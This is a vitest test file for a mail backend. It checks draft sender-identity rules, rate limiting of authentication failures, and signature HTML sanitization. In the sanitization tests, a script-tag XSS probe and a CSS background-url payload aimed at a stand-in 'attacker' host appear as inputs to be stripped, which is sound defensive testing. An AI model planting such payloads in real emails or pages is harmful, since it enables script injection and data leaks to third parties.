/**
 * Slice 3 coverage: setIdentity mutation + shared auth rate-limit table.
 */

import { convexTest } from 'convex-test';
import { describe, it, expect, vi } from 'vitest';
import schema from '../schema';
import { api, internal } from '../_generated/api';
import type { Id } from '../_generated/dataModel';

vi.mock('../lib/sessionOrganization', async () => {
	const actual = await vi.importActual('../lib/sessionOrganization');
	return {
		...actual,
		requireOrgMember: vi.fn().mockResolvedValue({ userId: 'test-user', role: 'owner' }),
		isActiveOrgMember: vi.fn().mockResolvedValue(true),
		getUserIdFromSession: vi.fn().mockResolvedValue('test-user'),
		getMutationContext: vi.fn().mockResolvedValue({ userId: 'test-user', role: 'owner' }),
		getBetterAuthSessionWithRole: vi.fn().mockResolvedValue({
			userId: 'test-user',
			role: 'owner',
			activeOrganizationId: 'test-org',
		}),
	};
});

const allModules = import.meta.glob('../**/*.*s');
const modules = Object.fromEntries(
	Object.entries(allModules).filter(([path]) =>
		!path.includes('sesActions') &&
		!path.includes('agentSecurity') &&
		!path.includes('agentContext') &&
		!path.includes('agentClassifier') &&
		!path.includes('agentDrafter') &&
		!path.includes('agentRouter') &&
		!path.includes('agent/walker') &&
		!path.includes('agent/steps/index') &&
		!path.includes('agent/steps/shared') &&
		!path.includes('agent/steps/classify') &&
		!path.includes('agent/steps/draft') &&
		!path.includes('knowledgeExtraction') &&
		!path.includes('semanticFileProcessing') &&
		!path.includes('visualizationAgent') &&
		!path.includes('llmProvider')
	)
);

async function seedMailbox(t: ReturnType<typeof convexTest>, address: string) {
	let mailboxId!: Id<'mailboxes'>;
	await t.run(async (ctx) => {
		const now = Date.now();
		mailboxId = await ctx.db.insert('mailboxes', {
			userId: 'test-user',
			organizationId: 'test-org',
			address,
			domain: address.split('@')[1],
			status: 'active',
			usedBytes: 0,
			uidValidity: now,
			createdAt: now,
			updatedAt: now,
		});
	});
	return mailboxId;
}

async function seedDraft(
	t: ReturnType<typeof convexTest>,
	mailboxId: Id<'mailboxes'>,
	fromAddress: string
): Promise<Id<'mailDrafts'>> {
	let id!: Id<'mailDrafts'>;
	await t.run(async (ctx) => {
		const now = Date.now();
		id = await ctx.db.insert('mailDrafts', {
			mailboxId,
			toAddresses: [],
			ccAddresses: [],
			bccAddresses: [],
			fromAddress,
			subject: '',
			bodyHtml: '',
			attachments: [],
			state: 'draft',
			lastEditedAt: now,
			createdAt: now,
		});
	});
	return id;
}

describe('mailDrafts.setIdentity', () => {
	it('accepts the canonical mailbox address', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');
		const draftId = await seedDraft(t, mailboxId, 'alice@example.com');

		// Doesn't throw — the mutation has no return value.
		await t.mutation(api.mail.drafts.setIdentity, {
			draftId,
			fromAddress: 'alice@example.com',
		});
		await t.run(async (ctx) => {
			const draft = await ctx.db.get(draftId);
			expect(draft?.fromAddress).toBe('alice@example.com');
		});
	});

	it('accepts an active alias', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');
		await t.run(async (ctx) => {
			await ctx.db.insert('mailAliases', {
				alias: 'alice+sales@example.com',
				targetMailboxId: mailboxId,
				organizationId: 'test-org',
				createdAt: Date.now(),
			});
		});
		const draftId = await seedDraft(t, mailboxId, 'alice@example.com');

		await t.mutation(api.mail.drafts.setIdentity, {
			draftId,
			fromAddress: 'alice+sales@example.com',
		});

		await t.run(async (ctx) => {
			const draft = await ctx.db.get(draftId);
			expect(draft?.fromAddress).toBe('alice+sales@example.com');
		});
	});

	it('rejects a foreign address', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');
		const draftId = await seedDraft(t, mailboxId, 'alice@example.com');

		await expect(
			t.mutation(api.mail.drafts.setIdentity, {
				draftId,
				fromAddress: 'ceo@example.com',
			})
		).rejects.toThrow(/not authorized/i);
	});

	it('rejects when the draft is already in pending_send', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');
		const draftId = await seedDraft(t, mailboxId, 'alice@example.com');
		await t.run(async (ctx) => {
			await ctx.db.patch(draftId, {
				state: 'pending_send',
				undoToken: 'tok',
				scheduledSendAt: Date.now(),
			});
		});

		await expect(
			t.mutation(api.mail.drafts.setIdentity, {
				draftId,
				fromAddress: 'alice@example.com',
			})
		).rejects.toThrow(/state is pending_send, expected draft/i);
	});
});

describe('mailAuthRateLimit', () => {
	it('throttles after 5 failures per address within the window', async () => {
		const t = convexTest(schema, modules);

		for (let i = 0; i < 5; i++) {
			await t.mutation(internal.mail.authRateLimit.recordFailure, {
				address: 'alice@example.com',
				ip: '1.2.3.4',
				scope: 'smtp',
			});
		}
		const throttled = await t.query(internal.mail.authRateLimit.isThrottled, {
			address: 'alice@example.com',
			ip: '1.2.3.4',
		});
		expect(throttled).toBe(true);
	});

	it('does not throttle below the per-address threshold', async () => {
		const t = convexTest(schema, modules);

		for (let i = 0; i < 4; i++) {
			await t.mutation(internal.mail.authRateLimit.recordFailure, {
				address: 'alice@example.com',
				ip: '1.2.3.4',
				scope: 'smtp',
			});
		}
		const throttled = await t.query(internal.mail.authRateLimit.isThrottled, {
			address: 'alice@example.com',
			ip: '1.2.3.4',
		});
		expect(throttled).toBe(false);
	});

	it('throttles per-IP independent of the address', async () => {
		const t = convexTest(schema, modules);
		// 50 distinct addresses, same IP
		for (let i = 0; i < 50; i++) {
			await t.mutation(internal.mail.authRateLimit.recordFailure, {
				address: `target${i}@example.com`,
				ip: '1.2.3.4',
				scope: 'smtp',
			});
		}
		const throttled = await t.query(internal.mail.authRateLimit.isThrottled, {
			address: 'fresh@example.com',
			ip: '1.2.3.4',
		});
		expect(throttled).toBe(true);
	});

	it('lowercases the address so case differences share a bucket', async () => {
		const t = convexTest(schema, modules);
		for (let i = 0; i < 5; i++) {
			await t.mutation(internal.mail.authRateLimit.recordFailure, {
				address: 'Alice@Example.com',
				ip: '1.2.3.4',
				scope: 'smtp',
			});
		}
		const throttled = await t.query(internal.mail.authRateLimit.isThrottled, {
			address: 'ALICE@EXAMPLE.COM',
		});
		expect(throttled).toBe(true);
	});

	it('sweepOld clears entries beyond the TTL', async () => {
		const t = convexTest(schema, modules);
		const longAgo = Date.now() - 25 * 60 * 60 * 1000;
		await t.run(async (ctx) => {
			await ctx.db.insert('mailAuthFailures', {
				address: 'old@example.com',
				ip: '1.2.3.4',
				scope: 'smtp',
				occurredAt: longAgo,
			});
		});
		const result = await t.mutation(internal.mail.authRateLimit.sweepOld, {});
		expect(result.swept).toBeGreaterThanOrEqual(1);
	});
});

describe('mailSignatures sanitization on save', () => {
	it('strips <script> from a saved signature', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');

		const sigId = await t.mutation(api.mail.signatures.create, {
			mailboxId,
			name: 'Default',
			html: '<p>Best,</p><script>alert(1)</script><p>Alice</p>',
		});

		await t.run(async (ctx) => {
			const sig = await ctx.db.get(sigId);
			expect(sig?.html).not.toMatch(/<script/i);
			expect(sig?.html).toMatch(/Best,/);
			expect(sig?.html).toMatch(/Alice/);
		});
	});

	it('strips <style> exfil from a saved signature', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');

		const sigId = await t.mutation(api.mail.signatures.create, {
			mailboxId,
			name: 'Default',
			html: '<style>p{background:url(https://attacker/?leak=test)}</style><p>Alice</p>',
		});

		await t.run(async (ctx) => {
			const sig = await ctx.db.get(sigId);
			expect(sig?.html).not.toMatch(/<style/i);
			expect(sig?.html).not.toMatch(/attacker/);
		});
	});

	it('preserves whitelisted markup', async () => {
		const t = convexTest(schema, modules);
		const mailboxId = await seedMailbox(t, 'alice@example.com');

		const sigId = await t.mutation(api.mail.signatures.create, {
			mailboxId,
			name: 'Default',
			html: '<p>Best,<br><strong>Alice</strong><br><a href="https://alice.example.com">site</a></p>',
		});

		await t.run(async (ctx) => {
			const sig = await ctx.db.get(sigId);
			expect(sig?.html).toMatch(/<strong>/);
			expect(sig?.html).toMatch(/<a[^>]*href="https:\/\/alice\.example\.com"/);
		});
	});
});
